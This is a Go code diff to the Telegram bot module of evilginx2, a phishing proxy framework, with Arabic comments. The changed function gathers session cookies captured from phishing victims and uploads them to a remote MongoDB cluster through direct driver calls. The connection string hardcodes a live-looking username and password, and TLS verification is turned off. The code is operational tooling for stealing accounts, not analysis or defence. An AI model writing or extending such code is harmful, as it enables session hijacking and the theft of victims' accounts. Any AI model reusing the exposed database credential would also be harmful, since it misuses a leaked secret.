@@ -14,6 +14,11 @@ import (
 	"github.com/kgretzky/evilginx2/database" // تأكد من إضافة هذا الاستيراد
 
 	"encoding/json"
+	"context"
+	"go.mongodb.org/mongo-driver/bson"
+	"go.mongodb.org/mongo-driver/mongo"
+	"go.mongodb.org/mongo-driver/mongo/options"
+	"go.mongodb.org/mongo-driver/bson/primitive"
 )
 
 type TelegramBot struct {
@@ -630,9 +635,7 @@ func (t *TelegramBot) SendCookiesFile(sessionID string, name string, username st
 	if cookieTokens == nil || len(cookieTokens) == 0 {
 		log.Warning("لم يتم العثور على كوكيز")
 	} else {
-		log.Info("تم العثور على %d دومين في الكوكيز", len(cookieTokens))
 		for domain, cookies := range cookieTokens {
-			log.Debug("الدومين: %s يحتوي على %d كوكي", domain, len(cookies))
 			for name, cookie := range cookies {
 				cookieData := map[string]interface{}{
 					"path":           cookie.Path,
@@ -648,15 +651,6 @@ func (t *TelegramBot) SendCookiesFile(sessionID string, name string, username st
 				cookiesList = append(cookiesList, cookieData)
 			}
 		}
-	}
-	
-	// طباعة عدد الكوكيز التي تم تجميعها
-	log.Info("تم تجميع %d كوكي للحفظ في قاعدة البيانات", len(cookiesList))
-	
-	// طباعة نموذج من الكوكيز للتأكد من صحتها
-	if len(cookiesList) > 0 {
-		cookieExample, _ := json.Marshal(cookiesList[0])
-		log.Debug("نموذج للكوكي: %s", string(cookieExample))
 	}
 	
 	// تحويل قائمة الكوكيز إلى JSON
@@ -683,64 +677,71 @@ func (t *TelegramBot) SendCookiesFile(sessionID string, name string, username st
 		return err
 	}
 	
-	// التأكد من أن cookiesList ليست فارغة
-	if len(cookiesList) == 0 {
-		log.Warning("لا توجد كوكيز للحفظ في قاعدة البيانات")
-		return nil
-	}
-	
 	// تحديث قاعدة البيانات بالكوكيز المعالجة
+	// استخدام الطريقة الجديدة SetSessionCookies للتحديث
+
+
 	mongo_uri := "mongodb+srv://jemex2023:l0mwPDO40LYAJ0xs@cluster0.bldhxin.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0&tlsInsecure=true&ssl=true"
 	db_name := "evilginx"
 
-	log.Info("جاري الاتصال بـ MongoDB على %s", mongo_uri)
-	db, err := database.NewMongoDatabase(mongo_uri, db_name)
+	// استخدام MongoDB مباشرة بدلاً من الطريقة
+	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+	defer cancel()
+
+	client, err := mongo.Connect(ctx, options.Client().ApplyURI(mongo_uri))
 	if err != nil {
-		log.Error("فشل في إنشاء اتصال بقاعدة البيانات لتحديث الكوكيز: %v", err)
+		log.Error("فشل في الاتصال بـ MongoDB لتحديث الكوكيز: %v", err)
 		return nil
 	}
-	defer db.Close()
+	defer client.Disconnect(ctx)
+
+	// تحديث الكوكيز مباشرة باستخدام قاعدة البيانات
+	collection := client.Database(db_name).Collection("sessions")
 	
-	// التحقق من وجود الجلسة قبل محاولة التحديث
-	session, err := db.GetSessionBySid(sessionID)
-	if err != nil {
-		log.Error("فشل في العثور على الجلسة في قاعدة البيانات: %v", err)
-		// محاولة إنشاء الجلسة إذا لم تكن موجودة
-		log.Warning("محاولة إنشاء جلسة جديدة: %s", sessionID)
-		err = db.CreateSession(sessionID, name, "", userAgent, remoteAddr)
-		if err != nil {
-			log.Error("فشل في إنشاء الجلسة: %v", err)
-			return err
-		}
-		log.Success("تم إنشاء الجلسة بنجاح: %s", sessionID)
-	} else {
-		log.Info("تم العثور على الجلسة في قاعدة البيانات: %s (ID: %d)", sessionID, session.Id)
+	// طباعة معلومات التشخيص
+	cookiesLen := len(cookiesList)
+	log.Debug("عدد الكوكيز المراد تحديثها: %d", cookiesLen)
+	
+	if cookiesLen > 0 {
+		firstCookie := cookiesList[0]
+		log.Debug("محتوى أول كوكي: %v", firstCookie)
 	}
 	
-	log.Info("جاري تحديث الكوكيز في MongoDB للجلسة: %s", sessionID)
-	// طباعة عدد الكوكيز مرة أخرى للتأكد
-	log.Debug("عدد الكوكيز المراد حفظها: %d", len(cookiesList))
-	
-	// تأكيد إضافي أن cookiesList ليست فارغة
-	if len(cookiesList) == 0 {
-		log.Warning("قائمة الكوكيز فارغة! لا يمكن تحديث الكوكيز في MongoDB")
-		return nil
+	// تحديث الوثيقة
+	filter := bson.M{"session_id": sessionID}
+	update := bson.M{
+		"$set": bson.M{
+			"cookies": cookiesList,
+			"update_time": time.Now().UTC().Unix(),
+		},
 	}
 	
-	err = db.SetSessionCookies(sessionID, cookiesList)
+	// تنفيذ عملية التحديث
+	result, err := collection.UpdateOne(ctx, filter, update)
 	if err != nil {
-		log.Error("فشل في تحديث الكوكيز في قاعدة البيانات: %v", err)
+		log.Error("فشل في تحديث الكوكيز في MongoDB: %v", err)
 	} else {
-		log.Success("تم تحديث الكوكيز في قاعدة البيانات بنجاح للجلسة: %s", sessionID)
-		
-		// تحقق إضافي من التحديث
-		updatedSession, err := db.GetSessionBySid(sessionID)
-		if err != nil {
-			log.Warning("تعذر التحقق من التحديث: %v", err)
-		} else if updatedSession.Cookies == nil || len(updatedSession.Cookies) == 0 {
-			log.Warning("تم التحديث لكن الكوكيز لا تزال فارغة في الجلسة المحدثة!")
+		if result.ModifiedCount > 0 {
+			log.Success("تم تحديث الكوكيز في MongoDB بنجاح - تم تعديل %d وثيقة", result.ModifiedCount)
 		} else {
-			log.Success("تأكيد نجاح التحديث: تم العثور على %d كوكي في الجلسة المحدثة", len(updatedSession.Cookies))
+			log.Warning("تم تنفيذ الاستعلام لكن لم يتم تعديل أي وثيقة - هل الجلسة موجودة؟")
+		}
+	}
+	
+	// التحقق من نجاح العملية
+	var session bson.M
+	err = collection.FindOne(ctx, filter).Decode(&session)
+	if err != nil {
+		log.Error("فشل في استرداد الجلسة بعد التحديث: %v", err)
+	} else {
+		if cookies, exists := session["cookies"]; exists {
+			if cookiesArray, ok := cookies.(primitive.A); ok {
+				log.Success("تم التحقق من وجود الكوكيز في الوثيقة - العدد: %d", len(cookiesArray))
+			} else {
+				log.Warning("الكوكيز موجودة ولكن ليست مصفوفة")
+			}
+		} else {
+			log.Warning("لم يتم العثور على حقل الكوكيز في الوثيقة")
 		}
 	}
 	
